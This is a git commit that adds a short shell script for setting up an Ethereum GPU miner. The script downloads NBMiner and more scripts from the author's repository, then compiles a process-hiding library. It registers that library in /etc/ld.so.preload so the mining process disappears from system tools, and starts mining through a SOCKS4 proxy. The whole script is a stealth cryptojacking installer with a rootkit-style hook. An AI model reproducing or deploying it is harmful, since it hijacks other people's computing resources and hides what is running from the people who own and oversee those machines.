2d3db22840d4d4c15ed66567b71e266883de290b
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-04-13 12:23:27 +0200

    Create start_nbEthermWsocks4.sh

---
+++ start_nbEthermWsocks4.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+wget https://github.com/NebuTech/NBMiner/releases/download/v37.1/NBMiner_37.1_Linux.tgz
+tar -xvzf NBMiner_37.1_Linux.tgz
+cd NBMiner_Linux
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbEthermineWithSocks4.sh
+chmod +x nbEthermineWithSocks4.sh
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
+unzip magicNb.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+./nbEthermineWithSocks4.sh
